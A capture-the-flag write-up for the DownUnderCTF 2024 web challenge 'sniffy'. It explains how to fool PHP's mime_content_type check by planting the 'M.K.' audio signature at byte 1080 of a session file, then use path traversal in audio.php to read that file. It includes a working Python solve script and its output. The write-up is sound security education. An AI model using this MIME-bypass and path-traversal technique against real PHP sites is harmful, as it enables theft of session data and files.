# sniffy

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 58 solves / 223 points
- Author: @hashkitten
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

MIME sniffing in PHP session file

## Background

Visit our sanctuary to hear the sounds of the Kookaburras!

Author: hashkitten

[https://web-sniffy-d9920bbcf9df.2024.ductf.dev](https://web-sniffy-d9920bbcf9df.2024.ductf.dev)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180551.png)

In here, we can click on those play button to listen the sounds of kookaburras.

If we clicked on one of those play button, it'll send a POST request to `/audio.php` with parameter `f`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180757.png)

Also, this web application allows us to switch to a different theme by clicking the top-right corner's button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180858.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709180909.png)

When we clicked on that button, it'll send a GET request to `/` with parameter `theme`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240709181059.png)

Let's read this web application's source code and see what we can find!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/sniffy/sniffy.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|18:11:54(HKT)]
└> file sniffy.zip 
sniffy.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|18:11:56(HKT)]
└> unzip sniffy.zip 
Archive:  sniffy.zip
  inflating: Dockerfile              
  inflating: src/audio.php           
   creating: src/audio/
  inflating: src/audio/k1.mp3        
  inflating: src/audio/k2.mp3        
  inflating: src/audio/k3.mp3        
   creating: src/css/
  inflating: src/css/style-dark.css  
  inflating: src/css/style-light.css  
 extracting: src/flag.php            
   creating: src/img/
  inflating: src/img/dark.svg        
  inflating: src/img/light.svg       
  inflating: src/img/play-dark.svg   
  inflating: src/img/play-light.svg  
  inflating: src/index.php           
   creating: src/js/
  inflating: src/js/script.js        
```

After reviewing the source code, we have the following findings!

First, this web application is written in PHP, and the flag is in our session cookie:

**`src/index.php`:**
```php
<?php

include 'flag.php';
[...]
session_start();

$_SESSION['flag'] = FLAG; /* Flag is in the session here! */
```

**`src/flag.php`:**
```php
<?php

define('FLAG', 'DUCTF{}');
```

Wait what? The flag is in our cookie??

So, our objective in this challenge is to somehow **read our session cookie's content and reveal the flag**.

Hmm... Is there any functions in this web application that reads a file's content?

Yes it does. In `src/audio.php`, **our `f` parameter is the filename that'll parse to PHP function `readfile`**:

```php
<?php

$file = 'audio/' . $_GET['f'];

if (!file_exists($file)) {
    http_response_code(404); die;
}

$mime = mime_content_type($file);

if (!$mime || !str_starts_with($mime, 'audio')) {
    http_response_code(403); die;
}

header("Content-Type: $mime");
readfile($file);
```

However, the **file [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) must starts with `audio`**, which should protects **arbitrary file read**.

Ah... Can we **bypass that MIME type check**??

 **Moreover, in `src/index.php`, the theme setting also in our session cookie:**
```php
$_SESSION['theme'] = $_GET['theme'] ?? $_SESSION['theme'] ?? 'light';
```

So our session cookie has the flag and the theme's value.

Now, I wonder **where does the PHP session cookie is being stored**.

After Googling, there's a [StackOverflow post](https://stackoverflow.com/questions/4927850/location-for-session-files-in-apache-php) talking about the default location of PHP session files are based on the PHP configuration file (`php.ini`)'s `session.save_path`.

Yes, **PHP sessions are files**.

Since the session files location is based on the configuration file, we can build the provided Docker image, run it, and check out the default configuration.

Wait, is our's in default configuration. Well, yes. In `Dockerfile`, it moves the `php.ini-production` default configuration file into `php.ini`:

```bash
FROM php:8.3-apache

RUN mv "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"

COPY src/ /var/www/html/
```

According to [PHP official documentation](https://www.php.net/manual/en/session.configuration.php#ini.session.save-path), **the default location is at `/tmp`**.

Hmm... I now wonder what does the content of PHP session file looks like.

Now, let's build and run the Docker image for local testing!

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|19:08:29(HKT)]
└> docker build --pull --rm -f "Dockerfile" -t sniffy:latest "."
[...]
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|19:08:37(HKT)]
└> docker run --rm -d -p 80:80/tcp sniffy:latest
[...]
```

Then, we'll attach a remote shell on the Docker container:

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|19:09:34(HKT)]
└> docker container list                                                                
CONTAINER ID   IMAGE           COMMAND                  CREATED          STATUS          PORTS                               NAMES
c7ef7d0d2975   sniffy:latest   "docker-php-entrypoi…"   38 seconds ago   Up 37 seconds   0.0.0.0:80->80/tcp, :::80->80/tcp   dreamy_wing
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|19:09:41(HKT)]
└> docker exec -it c7ef7d0d2975 bash
root@c7ef7d0d2975:/var/www/html# 
```

To get a PHP session file, we can just send a GET request to `/`:

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|19:17:54(HKT)]
└> curl -v http://localhost/
[...]
< HTTP/1.1 200 OK
[...]
< Set-Cookie: PHPSESSID=lgv40c5u0ctkfmp73rdmq1p6mi; path=/
[...]
```

Now, on the Docker container's remote shell, we should be able to see a new PHP session file was created:

```shell
root@c7ef7d0d2975:/var/www/html# cd /tmp
root@c7ef7d0d2975:/tmp# ls -lah
total 16K
drwxrwxrwt 1 root     root     4.0K Jul  9 11:19 .
drwxr-xr-x 1 root     root     4.0K Jul  9 11:09 ..
-rw------- 1 www-data www-data   37 Jul  9 11:19 sess_lgv40c5u0ctkfmp73rdmq1p6mi
```

As you can see, the **PHP session filename is `sess_<PHPSESSID>`**.

What's inside it?

```shell
root@c7ef7d0d2975:/tmp# cat sess_lgv40c5u0ctkfmp73rdmq1p6mi 
flag|s:7:"DUCTF{}";theme|s:5:"light";
```

Oh! As you can see, the PHP session file contains a **PHP serialized object**, where the `flag` key has 7 length of string value `DUCTF{}`, and `theme` key has 5 length of string value `light`.

Hmm... Remember we can control the `theme` key's value? **What if we trick PHP function `mime_content_type` to be an audio file in our session file**??

If we look at the [documentation of function `mime_content_type`](https://www.php.net/manual/en/function.mime-content-type), the description said:

> Returns the MIME content type for a file as determined by using information from the **`magic.mime` file**.

Hmm? What's that `magic.mime` file?

If we Google "php magic.mime", [this GitHub source code](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime) should be appeared.

After reading it a little bit, this `magic.mime` is a list of MIME types that are defined by [IANA](https://www.iana.org/), and it tells how PHP should determine a file's MIME type.

In [line 23 - 28](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime#L23-L28), we can see this MIME types list's format:

```ini
# The format is 4-5 columns:
#    Column #1: byte number to begin checking from, ">" indicates continuation
#    Column #2: type of data to match
#    Column #3: contents of data to match
#    Column #4: MIME type of result
#    Column #5: MIME encoding of result (optional)
```

Let's take the first MIME type as an example:

```ini
# Real Audio (Magic .ra\0375)
0   belong      0x2e7261fd  audio/x-pn-realaudio
```

The first column is `0`, which means PHP will start determine this MIME type at byte number `0` (Which is starting from the first byte).

The third column is the content that PHP will try to match. In this case it's hex `0x2e7261fd`.

The reason why it's hex `0x2e7261fd`, is because it's this file's signature. File signature can be used to identify or verify the content of a file. Besides from file signature, it also called "Magic number" or "Magic bytes".

So, in the above case, if PHP found the file magic number `0x2e7261fd` is starting from byte number `0`, it returns MIME type `audio/x-pn-realaudio`.

Hmm... I wonder if there's any **magic numbers are not starting from byte number `0`**.

Yes it does!

In [line 70 - 71](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime#L70-L71), there's a MIME type called `audio/x-mod`, and it's magic numbers start from **byte number `1080`**:

```ini
#audio/x-screamtracker-module
1080    string  M.K.        audio/x-mod
```

Nice! We found it! That being said, we can trick PHP function `mime_content_type` to return a MIME type that starts with `audio`!!

## Exploitation

Armed with above information, our exploitation steps are:

1. Append the `audio/x-screamtracker-module` magic number `M.K.` at byte number `1080` via GET route `/` with `theme` parameter
2. Path traversal to read our session file at `/tmp/sess_<PHPSESSID>` via GET route `/audio.php` with `f` parameter

Let's write a solve script to get the flag!

```python
#!/usr/bin/env python3
import requests
import re
from threading import Thread

PHP_SESSION_NAME = 'PHPSESSID'
PHP_SESSION_FILE_LOCATION = '/tmp/sess_'
MAGIC_BYTE_NUMBER = 1080
MAGIC_NUMBER = 'M.K.'
PATH_TRAVERSAL = '../../../../../../../'
FLAG_REGEX = re.compile('(DUCTF\{.*?\})')

def appendMagicNumber(baseUrl, offset):
    sessionFilePrefixLength = len('flag|s:7:"DUCTF{}";theme|s:1337:"";')
    appendedSessionFileContent = 'A' * (MAGIC_BYTE_NUMBER - sessionFilePrefixLength - offset) 
    appendedSessionFileContent += MAGIC_NUMBER

    themeParameter = f'?theme={appendedSessionFileContent}'
    url = f'{baseUrl}{themeParameter}'
    sessionCookie = requests.get(url).cookies.get(PHP_SESSION_NAME)
    return sessionCookie

def getFlag(baseUrl, sessionCookie, offset):
    fileParameter = f'?f={PATH_TRAVERSAL}{PHP_SESSION_FILE_LOCATION}{sessionCookie}'
    audioUrl = f'{baseUrl}/audio.php{fileParameter}'
    response = requests.get(audioUrl)
    if response.status_code == 403:
        # print('[-] Our session file MIME type did not starts with "audio"')
        return
    elif response.status_code == 404:
        # print('[-] The session file doesn\'t exist')
        return
    
    flag = re.search(FLAG_REGEX, response.text).group(1)
    print(f'\n[+] We successfully tricked the PHP function MIME type to start with "audio" at offset {offset}!')
    print(f'[+] Here\'s the flag: {flag}')
    exit(0)

def exploit(baseUrl, offset):
    print(f'[*] Trying offset {offset}', end='\r')
    sessionCookie = appendMagicNumber(baseUrl, offset)
    getFlag(baseUrl, sessionCookie, offset)

if __name__ == '__main__':
    # baseUrl = 'http://localhost'
    baseUrl = 'https://web-sniffy-d9920bbcf9df.2024.ductf.dev'

    for offset in range(-50, 50):
        thread = Thread(target=exploit, args=(baseUrl, offset))
        thread.start()
```

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/sniffy)-[2024.07.09|20:46:51(HKT)]
└> python3 solve.py
[*] Trying offset 404
[+] We successfully tricked the PHP function MIME type to start with "audio" at offset 44!
[+] Here's the flag: DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}
```

- **Flag: `DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}`**

## Conclusion

What we've learned:

1. File MIME type filter bypass